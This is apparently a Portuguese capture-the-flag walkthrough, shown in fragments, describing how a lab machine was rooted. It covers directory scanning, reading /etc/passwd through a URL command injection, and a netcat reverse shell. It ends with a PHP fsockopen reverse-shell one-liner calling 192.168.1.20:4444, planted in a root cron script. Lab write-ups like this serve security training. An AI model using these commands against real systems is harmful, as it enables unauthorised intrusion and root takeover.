...
5. Conseguindo shelL remota com Python.
...
# Passo 1: Encontrando o IP da máquina alvo.
  ...
  **_Comando usado : dirb 192.168.1.24_**
  ...
  Alguns arquivos foram encontrados como resultado do scan. Existe alguns arquivos que retornaram status 200 do servidor.
...
Tentando ler o arquivo **_"/etc/passwd"_** através da execução do comando na URL. O resultado pode ser visto abaixo:
...
Tentando o terceiro método primeiro, para isso basta verificar se á máquina alvo possui o netcat. Podemos rodar o comando **"nc --help"**, se o comando retornar o resultado quer dizer que o netcat está disponível.
  ...
  **_Comando usado:_**
  ...
  Como se pode ver, eu coloquei o netcat para rodar na porta <<1234>> e então inseri o comando no navegador para receber a conexão reversa.
  
  
  # Passo 6
  
  Agora temos o acesso a shell, mas é um acesso limitado. E o objectivo é conseguir acesso root. Então primeiro executa-se o comando para que nos dá acesso estável a shell.
 ...
 Buscando por permissões de arquivo **<<cat /etc/crontab>>**, temos um Cron que é executado como root a cada 5 minutos
  ...
  Mudando de diretório para **/var/www/html**  e lendo os  arquivos e suas permissões pode-se ver que com o nível de acesso atual, é possivel editar o arquivo **"write.sh"**, que será excutado pelo Cron, que por sua vez roda como root.
  ...
  **_php -r ‘$sock=fsockopen(“192.168.1.20”,4444);exec(“/bin/sh -i<&3 >&3 2>&3”);’_**
  ...
  Desta maneira o sistema alvo se conectará a nós (conexão reversa) na porta 4444 (usando o netcat para escutar na porta  4444). Como a ativade Cron estava configurada para executar a cada 5 minutos, aguardando esse tempo temos a conexão.
  
   <h1 align="center">
  <img alt="" title="Imagem17" src="Imagens/Imagem17.png" />
  </h1> 
  
  Agora que temos acesso root, objetivo deste CTF, Podemos ler a flag **cat root.txt**
